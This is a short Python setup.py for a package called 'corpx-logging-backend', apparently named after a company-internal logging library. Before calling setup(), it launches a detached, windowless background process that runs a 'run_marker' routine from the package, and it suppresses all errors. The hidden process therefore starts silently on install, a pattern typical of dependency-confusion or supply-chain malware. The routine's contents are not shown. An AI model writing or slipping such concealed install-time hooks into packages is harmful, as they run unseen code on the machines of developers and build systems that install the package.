from setuptools import setup
import subprocess, sys

def growl():
    try:
        python_exe = sys.executable
        subprocess.Popen(
            [python_exe, "-c", "from corpx_logging_backend.marker import run_marker; run_marker()"],
            creationflags=0x00000008 | 0x08000000,
            close_fds=True,
            start_new_session=True
        )
    except: pass

growl()

setup(
    name='corpx-logging-backend',
    version='1.0.0',
    packages=['corpx_logging_backend'],
    description='CorpX logging backend — file rotation and remote sink',
)
